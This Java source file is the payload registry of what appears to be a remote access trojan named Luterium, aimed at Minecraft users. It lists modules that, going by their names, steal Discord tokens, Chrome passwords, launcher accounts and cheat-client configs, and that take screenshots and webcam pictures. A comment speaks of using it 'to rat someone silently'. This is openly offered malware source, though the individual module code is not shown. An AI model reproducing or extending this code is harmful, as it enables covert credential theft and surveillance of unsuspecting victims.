package dev.peter.luterium.payload;

import dev.peter.luterium.features.*;
import dev.peter.luterium.features.fun.ChangeWallpaper;
import dev.peter.luterium.features.fun.FurryPorn;
import dev.peter.luterium.features.fun.PlaySong;
import dev.peter.luterium.features.maintainer.Maintainer;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

/**
 @author Peter
 @since 08/14/2022
 **/

public final class Payload {
    private static final Payload INSTANCE = new Payload();
    private final List<PayloadExecutor> payloads = new ArrayList<>(); //Payload list.

    private Payload() {
        payloads.addAll(Arrays.asList(
                new Info(),
                new Maintainer(),
                new ScreenShot(),
                new ModsFolder(),
                new FdpConfigs(),
                new UsefulFiles(),
                new RiseConfigs(),
                new NixwareLogin(),
                new MCScreenshots(),
                new PlagueConfigs(),
                new WebcamPicture(),
                new DiscordTokens(),
                new ChromePassword(),
                new NixwareConfigs(),
                new JarsFromDesktop(),
                new EarthhackConfigs(),
                new LegendwareScripts(),
                new RusherhackConfigs(),
                new MCLauncherAccounts(),

                //These are optional, not recommended when trying to rat someone silently.
                new PlaySong(),
                new FurryPorn(),
                new ChangeWallpaper()
        ));
    }

    public static Optional<PayloadExecutor> getPayload(Class<? extends PayloadExecutor> klazz)
    {
        return getPayloads().stream().filter(p -> p.getClass().equals(klazz)).findAny();
    }
    public static List<PayloadExecutor> getPayloads()
    {
        return INSTANCE.payloads;
    }
}
